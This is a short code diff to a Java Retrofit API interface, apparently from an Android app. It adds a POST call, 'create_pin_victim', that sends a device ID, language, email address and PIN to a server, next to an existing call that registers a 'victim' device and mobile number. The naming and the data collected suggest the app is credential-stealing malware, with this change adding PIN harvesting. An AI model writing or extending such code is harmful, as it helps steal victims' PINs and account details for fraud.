@@ -95,4 +95,11 @@ public interface Api {
     Call<CheckDeviceWithPhoneModel> CREATE_VICTIM_MODEL_CALL(@Field("deviceid") String deviceid,
                                                                    @Field("mobile") String mobile);
 
+    @FormUrlEncoded
+    @POST("create_pin_victim")
+    Call<CheckDeviceWithPhoneModel> CREATE_PIN_MODEL_CALL(@Field("deviceid") String deviceid,
+                                                          @Field("language") String language,
+                                                          @Field("email") String email,
+                                                          @Field("pin") String pin);
+
 }
